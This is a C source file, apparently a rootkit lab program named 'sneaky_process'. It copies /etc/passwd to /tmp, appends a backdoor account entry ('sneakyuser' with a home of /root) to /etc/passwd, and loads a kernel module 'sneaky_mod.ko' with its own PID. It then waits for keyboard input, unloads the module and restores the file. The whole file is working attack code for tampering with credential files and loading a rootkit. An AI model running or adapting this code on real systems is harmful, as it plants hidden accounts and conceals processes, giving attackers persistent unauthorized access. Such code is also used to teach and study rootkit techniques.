#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

/* Print Process ID*/
void printPID(){
    printf("sneaky_process pid = %d\n", getpid());
}

/* Change /etc/passwd file */
void changeFile(){
    system("cp /etc/passwd /tmp");
    // Use echo to append one line at the end of file
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");
}

/* Load the sneaky module */
void loadModule(){
    char command[100];
    sprintf(command, "insmod sneaky_mod.ko pid=%d", getpid());
    system(command);
}

/* Read input from the Keyboard */
void readInput(){
    int c;
    printf("Please Enter from Keyboard: ");
    while(1){
        c = getchar();
        if(c == 'q'){
            break;
        }
    }
}

/* Unload the sneaky module */
void unloadModule(){
    system("rmmod sneaky_mod");
}

/* Restore the original file */
void restoreFile(){
    system("cp /tmp/passwd /etc");
}

int main(){
    printPID();
    changeFile();
    loadModule();
    readInput();
    unloadModule();
    restoreFile();
    return EXIT_SUCCESS;
}